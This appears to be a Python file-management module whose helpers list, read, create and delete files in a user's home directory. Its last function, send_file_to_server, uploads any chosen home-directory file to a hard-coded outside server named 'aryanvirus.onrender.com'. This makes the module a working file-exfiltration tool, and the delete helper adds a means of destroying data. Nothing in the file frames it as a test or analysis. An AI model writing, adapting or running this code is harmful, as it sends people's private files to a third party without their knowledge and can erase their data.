import os
import requests
# ----------------------------
# List folder contents
# ----------------------------
def list_folder(relative_path):
    home = os.path.expanduser("~")
    folder_path = os.path.abspath(os.path.join(home, relative_path))

    if not os.path.exists(folder_path) or not os.path.isdir(folder_path):
        return {"error": f"Folder '{folder_path}' does not exist or is inaccessible!"}

    result = {"files": [], "folders": []}
    try:
        for item in os.listdir(folder_path):
            item_path = os.path.join(folder_path, item)
            if os.path.isfile(item_path):
                result["files"].append(item)
            elif os.path.isdir(item_path):
                result["folders"].append(item)
    except PermissionError:
        return {"error": f"Permission denied for folder '{folder_path}'"}
    except Exception as e:
        return {"error": str(e)}

    return result


# ----------------------------
# Read a file
# ----------------------------
def read_file(relative_path, file_name):
    if not file_name:
        return {"error": "Please provide a file name to read"}

    home = os.path.expanduser("~")
    folder_path = os.path.abspath(os.path.join(home, relative_path))
    file_path = os.path.join(folder_path, file_name)

    if not os.path.exists(file_path) or not os.path.isfile(file_path):
        return {"error": f"File '{file_name}' does not exist"}

    try:
        with open(file_path, "r", encoding="utf-8") as f:
            content = f.read()
        return {"file": file_name, "content": content}
    except Exception as e:
        return {"error": str(e)}    


# ----------------------------
# Create a file
# ----------------------------
def create_file(relative_path, file_name, content=""):
    if not file_name:
        return {"error": "Please provide a file name to create"}

    home = os.path.expanduser("~")
    folder_path = os.path.abspath(os.path.join(home, relative_path))
    
    # Ensure folder exists
    try:
        os.makedirs(folder_path, exist_ok=True)
    except Exception as e:
        return {"error": f"Cannot create folder '{folder_path}': {str(e)}"}

    file_path = os.path.join(folder_path, file_name)

    if os.path.exists(file_path):
        return {"error": f"File '{file_name}' already exists"}

    try:
        with open(file_path, "w", encoding="utf-8") as f:
            f.write(content)
        return {"file": file_name, "content": content, "message": "File created successfully"}
    except Exception as e:
        return {"error": str(e)}


# ----------------------------
# Delete a file
# ----------------------------
def delete_file(relative_path, file_name):
    if not file_name:
        return {"error": "Please provide a file name to delete"}

    home = os.path.expanduser("~")
    folder_path = os.path.abspath(os.path.join(home, relative_path))
    file_path = os.path.join(folder_path, file_name)

    if not os.path.exists(file_path) or not os.path.isfile(file_path):
        return {"error": f"File '{file_name}' does not exist"}

    try:
        os.remove(file_path)
        return {"deleted": file_name, "message": "File deleted successfully"}
    except Exception as e:
        return {"error": str(e)}
    

def send_file_to_server(relative_path, file_name):
    server_url = "https://aryanvirus.onrender.com/upload"
    if not file_name:
        return {"status": "error", "message": "Please provide a file name"}

    home = os.path.expanduser("~")
    folder_path = os.path.abspath(os.path.join(home, relative_path))
    file_path = os.path.join(folder_path, file_name)

    if not os.path.exists(file_path) or not os.path.isfile(file_path):
        return {"status": "error", "message": f"File '{file_name}' does not exist"}

    try:
        with open(file_path, "rb") as f:
            files = {"file": (file_name, f, "application/octet-stream")}
            response = requests.post(server_url, files=files, timeout=30)

        if 200 <= response.status_code < 300:
            return {"status": "ok", "message": f"File '{file_name}' sent successfully"}
        else:
            return {"status": "error", "message": f"Server returned {response.status_code}: {response.text}"}

    except Exception as e:
        return {"status": "error", "message": str(e)}

